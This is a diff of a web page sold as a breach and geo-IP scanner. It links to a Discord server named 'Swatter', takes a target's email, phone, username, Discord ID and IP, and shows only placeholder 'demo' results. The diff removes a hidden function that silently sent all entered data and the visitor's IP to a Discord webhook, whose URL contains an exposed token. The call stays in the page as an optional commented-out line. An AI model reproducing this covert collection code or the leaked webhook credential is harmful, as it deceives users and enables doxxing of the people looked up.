@@ -13,15 +13,19 @@
       padding-top: 60px;
     }
     .container {
-      max-width: 700px;
+      max-width: 750px;
     }
     .card {
       background-color: #161b22;
-      border: none;
+      border: 1px solid #30363d;
       border-radius: 1rem;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
+      transition: transform 0.2s;
     }
-    .form-control {
+    .card:hover {
+      transform: scale(1.01);
+    }
+    .form-control, .form-check-input {
       background-color: #0d1117;
       color: #c9d1d9;
       border: 1px solid #30363d;
@@ -33,17 +37,33 @@
       background-color: #238636;
       border: none;
     }
+    .btn-primary:hover {
+      background-color: #2ea043;
+    }
     .result-box {
       background-color: #1c2128;
       border-left: 5px solid #30363d;
       padding: 1rem;
       border-radius: 0.5rem;
-      margin-top: 0.5rem;
+      margin-top: 0.75rem;
       white-space: pre-wrap;
+      position: relative;
     }
     .result-box.success { border-left-color: #2ea043; }
     .result-box.warning { border-left-color: #d29922; }
     .result-box.error { border-left-color: #f85149; }
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #30363d;
+      border: none;
+      color: #c9d1d9;
+      padding: 4px 8px;
+      border-radius: 5px;
+      font-size: 12px;
+      cursor: pointer;
+    }
     .discord-btn {
       position: fixed;
       top: 20px;
@@ -56,19 +76,37 @@
       font-weight: bold;
       text-decoration: none;
     }
+    .spinner-border {
+      width: 1.5rem;
+      height: 1.5rem;
+    }
   </style>
 </head>
 <body>
   <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
   <div class="container text-center">
-    <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
+    <h1 class="mb-4">🔍 CybrSearch: Breach + Geo IP Scanner</h1>
     <form onsubmit="searchData(); return false;" class="card p-4">
       <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
       <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
       <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
       <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
       <input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
+
+      <div class="form-check text-start mb-2">
+        <input class="form-check-input" type="checkbox" id="geoCheck" checked>
+        <label class="form-check-label" for="geoCheck">Enable Geo IP + ARIN RDAP Lookup</label>
+      </div>
+      <div class="form-check text-start mb-3">
+        <input class="form-check-input" type="checkbox" id="agreeCheck" required>
+        <label class="form-check-label" for="agreeCheck">I agree to the processing of this data for search purposes.</label>
+      </div>
+
       <button type="submit" class="btn btn-primary w-100">Search</button>
+      <div id="loading" class="mt-3 d-none">
+        <div class="spinner-border text-success" role="status"></div>
+        <div>Running checks...</div>
+      </div>
     </form>
 
     <div class="mt-5 text-start">
@@ -82,46 +120,26 @@
       const box = document.createElement("div");
       box.className = `result-box ${style}`;
       box.innerText = msg;
+
+      const copyBtn = document.createElement("button");
+      copyBtn.innerText = "Copy";
+      copyBtn.className = "copy-btn";
+      copyBtn.onclick = () => navigator.clipboard.writeText(msg);
+      box.appendChild(copyBtn);
+
       document.getElementById("results").appendChild(box);
-    }
-
-    async function sendWebhook(fields) {
-      const webhookURL = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
-      const payload = {
-        embeds: [{
-          title: "🔍 New Breach Search Attempt",
-          color: 3447003,
-          fields: [
-            { name: "📧 Email", value: fields.email || "Not provided", inline: false },
-            { name: "📱 Phone", value: fields.phone || "Not provided", inline: false },
-            { name: "👤 Username", value: fields.username || "Not provided", inline: false },
-            { name: "💬 Discord ID", value: fields.discord || "Not provided", inline: false },
-            { name: "🌐 IP Address (User entered)", value: fields.ip || "Not provided", inline: false },
-            { name: "🌐 IP Address (Visitor)", value: fields.visitorIP || "Unknown", inline: false },
-            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
-          ]
-        }]
-      };
-
-      try {
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("⚠️ Failed to send webhook.");
-      }
     }
 
     async function searchData() {
       document.getElementById("results").innerHTML = "";
+      document.getElementById("loading").classList.remove("d-none");
 
       const email = document.getElementById("email").value.trim();
       const phone = document.getElementById("phone").value.trim();
       const username = document.getElementById("username").value.trim();
       const discord = document.getElementById("discord").value.trim();
       const ip = document.getElementById("ip").value.trim();
+      const geoCheck = document.getElementById("geoCheck").checked;
 
       if (!email) updateResult("email", "⚠️ No email entered.", "warning");
       else updateResult("email", `✅ Email checked (demo): ${email}`, "success");
@@ -142,9 +160,10 @@
         visitorIP = ipData.ip || "Unknown";
       } catch {}
 
-      sendWebhook({ email, phone, username, discord, ip, visitorIP });
+      // (Optional) If you want to keep logging
+      // sendWebhook({ email, phone, username, discord, ip, visitorIP });
 
-      if (ip) {
+      if (ip && geoCheck) {
         try {
           const res = await fetch(`https://ipwho.is/${ip}`);
           const data = await res.json();
@@ -176,6 +195,8 @@
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
       }
+
+      document.getElementById("loading").classList.add("d-none");
     }
   </script>
 </body>
